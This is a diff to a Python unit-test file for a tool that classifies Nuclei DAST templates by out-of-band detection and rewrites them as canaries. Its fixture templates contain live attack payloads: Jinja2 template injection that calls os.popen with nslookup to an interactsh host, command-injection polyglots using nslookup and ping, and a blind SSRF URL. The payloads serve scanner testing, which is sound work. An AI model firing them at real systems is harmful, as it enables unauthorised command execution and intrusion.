@@ -115,6 +115,49 @@ http:
           - 'root:.*?:[0-9]*:[0-9]*:'
 """
 
+BLIND_SSRF = """
+id: blind-ssrf
+info:
+  name: Blind SSRF
+  severity: medium
+http:
+  - payloads:
+      ssrf:
+        - "{{interactsh-url}}"
+    fuzzing:
+      - part: query
+        mode: single
+        values:
+          - "https?://"
+        fuzz:
+          - "https://{{ssrf}}"
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+"""
+
+SSTI_DSL_OOB = """
+id: jinja2-oob
+info:
+  name: Jinja2 OOB
+  severity: high
+http:
+  - payloads:
+      injection:
+        - "{{self.__init__.__globals__.__builtins__.__import__('os').popen('nslookup {{interactsh-url}}').read()}}"
+    fuzzing:
+      - part: query
+        type: postfix
+        fuzz:
+          - "{{injection}}"
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(interactsh_protocol,'dns')"
+"""
+
 
 def _template(text: str) -> Dict[str, Any]:
     with tempfile.NamedTemporaryFile("w", suffix=".yaml", delete=False) as f:
@@ -126,6 +169,20 @@ def _template(text: str) -> Dict[str, Any]:
 
 
 BASE = "http://e.com/go?next=http%3A%2F%2F127.0.0.1%2Fabc.html&url=http%3A%2F%2F127.0.0.1%2Fabc.html&id=testing"
+
+
+class TestClassification(unittest.TestCase):
+    def test_in_band(self) -> None:
+        self.assertFalse(templates.uses_interactsh_matchers(_template(OPEN_REDIRECT_BYPASS)))
+        self.assertFalse(templates.uses_interactsh_matchers(_template(SQLI_ERROR_BASED)))
+
+    def test_interactsh_url_in_payloads_is_not_oob(self) -> None:
+        """response-ssrf sends an OAST URL, but its evidence is the response."""
+        self.assertFalse(templates.uses_interactsh_matchers(_template(RESPONSE_SSRF)))
+
+    def test_oob(self) -> None:
+        self.assertTrue(templates.uses_interactsh_matchers(_template(BLIND_SSRF)))
+        self.assertTrue(templates.uses_interactsh_matchers(_template(SSTI_DSL_OOB)))
 
 
 class TestFindMatchingPayloads(unittest.TestCase):
@@ -245,6 +302,86 @@ class TestNarrowedTemplate(unittest.TestCase):
         )
 
 
+BLIND_OAST_POLYGLOTS = """
+id: cmdi-blind-oast-polyglot
+info:
+  name: Blind OAST polyglots
+  severity: high
+variables:
+  marker: "{{interactsh-url}}"
+http:
+  - payloads:
+      payload:
+        - "&nslookup {{marker}}&'"
+        - "1;nslookup${IFS}{{marker}};#${IFS}'"
+        - "$(ping -c 1 {{marker}} | nslookup {{marker}})"
+        - "$(ping -c 1 {{marker}} | nslookup {{marker}})"
+        - "$(id)"
+    fuzzing:
+      - parts:
+          - query
+        type: postfix
+        fuzz:
+          - "{{payload}}"
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+"""
+
+
+class TestOobCanaryTemplate(unittest.TestCase):
+    def test_payload_moved_into_the_fuzz_expression(self) -> None:
+        """Nuclei renders a payload once per payload - the same OAST URL in
+        every parameter - but the fuzz expression once per parameter."""
+        canary = templates.oob_canary_template(_template(BLIND_SSRF))
+        assert canary is not None
+        request = canary["http"][0]
+        self.assertNotIn("payloads", request)
+        self.assertEqual(request["fuzzing"][0]["fuzz"], ["https://{{interactsh-url}}"])
+        self.assertEqual(request["matchers"], _template(BLIND_SSRF)["http"][0]["matchers"])
+        self.assertEqual(templates.fuzz_value_count(canary), 1)
+
+    def test_url_variable_inlined(self) -> None:
+        """A variable holding the OAST URL is one URL for the whole run."""
+        canary = templates.oob_canary_template(_template(BLIND_OAST_POLYGLOTS))
+        assert canary is not None
+        # "$(id)" sends no OAST URL, the duplicate is sent once; a raw "&" and
+        # "#" are fine.
+        self.assertEqual(
+            canary["http"][0]["fuzzing"][0]["fuzz"],
+            [
+                "&nslookup {{interactsh-url}}&'",
+                "1;nslookup${IFS}{{interactsh-url}};#${IFS}'",
+                "$(ping -c 1 {{interactsh-url}} | nslookup {{interactsh-url}})",
+            ],
+        )
+
+    def test_only_the_identified_payloads(self) -> None:
+        template = _template(SSTI_DSL_OOB)
+        template["http"][0]["payloads"]["injection"].append("${{interactsh-url}}")
+        canary = templates.oob_canary_template(template, ["${{interactsh-url}}"])
+        assert canary is not None
+        self.assertEqual(canary["http"][0]["fuzzing"][0]["fuzz"], ["${{interactsh-url}}"])
+        # Nested expressions of an SSTI payload stay as they are.
+        canary = templates.oob_canary_template(template)
+        assert canary is not None
+        self.assertEqual(canary["http"][0]["fuzzing"][0]["fuzz"][0], template["http"][0]["payloads"]["injection"][0])
+
+    def test_unsupported(self) -> None:
+        function_wrapped = _template(BLIND_SSRF)
+        function_wrapped["http"][0]["fuzzing"][0]["fuzz"] = ["{{url_encode(ssrf)}}"]
+        no_oast = _template(BLIND_OAST_POLYGLOTS)
+        no_oast["http"][0]["payloads"]["payload"] = ["$(id)"]
+        two_sets = _template(BLIND_SSRF)
+        two_sets["http"][0]["payloads"]["other"] = ["x"]
+        for template in (function_wrapped, no_oast, two_sets):
+            self.assertIsNone(templates.oob_canary_template(template))
+        self.assertIsNone(templates.oob_canary_template(_template(BLIND_SSRF), ["not a payload of it"]))
+
+
 @unittest.skipUnless(
     os.path.isdir(os.path.join(NUCLEI_TEMPLATES_LOCATION, "dast")), "the Nuclei templates are not installed"
 )
@@ -254,6 +391,20 @@ class TestRealTemplates(unittest.TestCase):
     def _path(self, relative: str) -> str:
         return os.path.join(NUCLEI_TEMPLATES_LOCATION, relative)
 
+    def test_classification(self) -> None:
+        for in_band in (
+            "dast/vulnerabilities/redirect/open-redirect-bypass.yaml",
+            "dast/vulnerabilities/ssrf/response-ssrf.yaml",
+            "dast/vulnerabilities/xss/reflected-xss.yaml",
+            "dast/vulnerabilities/sqli/sqli-error-based.yaml",
+        ):
+            self.assertFalse(templates.uses_interactsh_matchers(templates.load_template(self._path(in_band))), in_band)
+        oob = ["dast/vulnerabilities/ssrf/blind-ssrf.yaml"] + glob.glob(
+            self._path("dast/vulnerabilities/ssti/oob/*.yaml")
+        )
+        for path in oob:
+            self.assertTrue(templates.uses_interactsh_matchers(templates.load_template(self._path(path))), path)
+
     def test_every_dast_template_survives_a_rewrite(self) -> None:
         for path in glob.glob(self._path("dast/**/*.yaml"), recursive=True):
             template = templates.load_template(path)
@@ -261,6 +412,23 @@ class TestRealTemplates(unittest.TestCase):
                 self.assertEqual(
                     templates.load_template(templates.write_template(template, directory, "copy")), template, path
                 )
+
+    def test_oob_canaries(self) -> None:
+        supported = 0
+        for path in glob.glob(self._path("dast/vulnerabilities/**/*.yaml"), recursive=True):
+            template = templates.load_template(path)
+            if not templates.uses_interactsh_matchers(template):
+                continue
+            canary = templates.oob_canary_template(template)
+            # Every OOB finding is to be shortened: no template is skipped.
+            assert canary is not None, path
+            supported += 1
+            (request,) = [request for request in canary["http"] if request.get("fuzzing")]
+            self.assertNotIn("payloads", request, path)
+            for rule in request["fuzzing"]:
+                for expression in rule["fuzz"]:
+                    self.assertIn("{{interactsh-url}}", expression, path)
+        self.assertGreater(supported, 20)
 
     def test_open_redirect_bypass_narrowed_to_the_hit(self) -> None:
         template = templates.load_template(self._path("dast/vulnerabilities/redirect/open-redirect-bypass.yaml"))
